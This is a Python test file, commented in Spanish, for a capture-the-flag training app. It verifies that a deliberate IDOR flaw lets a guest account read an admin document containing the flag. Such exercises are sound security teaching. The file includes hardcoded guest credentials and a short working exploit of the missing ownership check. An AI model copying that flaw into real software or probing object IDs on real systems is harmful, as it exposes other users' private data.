"""
Tests de VaultApp (IDOR challenge).
Verifica que la vulnerabilidad IDOR está presente y es explotable.
"""
import requests, time

BASE = "http://localhost:8080"


def wait_up(timeout=15):
    for _ in range(timeout * 5):
        try:
            if requests.get(f"{BASE}/health", timeout=1).status_code == 200:
                return
        except Exception:
            pass
        time.sleep(0.2)
    raise RuntimeError("Servicio no disponible")


def test_login_invitado():
    wait_up()
    r = requests.post(f"{BASE}/api/login",
                      json={"usuario": "invitado", "password": "invitado123"})
    assert r.status_code == 200
    data = r.json()
    assert "tu_id_de_usuario" in data
    assert data["tu_id_de_usuario"] == 1001


def test_sin_autenticar_rechaza():
    s = requests.Session()
    r = s.get(f"{BASE}/api/mis-documentos")
    assert r.status_code == 401


def test_invitado_ve_sus_propios_docs():
    s = requests.Session()
    s.post(f"{BASE}/api/login",
           json={"usuario": "invitado", "password": "invitado123"})
    r = s.get(f"{BASE}/api/mis-documentos")
    assert r.status_code == 200
    data = r.json()
    assert data["usuario_id"] == 1001
    # No debe ver documentos del admin en /api/mis-documentos
    titulos = [d["titulo"] for d in data["documentos"]]
    assert "FLAG CONFIDENCIAL" not in titulos


def test_idor_accede_doc_admin():
    """El alumno debe encontrar este exploit: doc_id=2 pertenece al admin."""
    s = requests.Session()
    s.post(f"{BASE}/api/login",
           json={"usuario": "invitado", "password": "invitado123"})
    # IDOR: el invitado accede al documento ID=2 (del admin)
    r = s.get(f"{BASE}/api/documentos/2")
    assert r.status_code == 200
    doc = r.json()["documento"]
    assert doc["contenido"].startswith("CTF{")
    assert doc["contenido"].endswith("}")
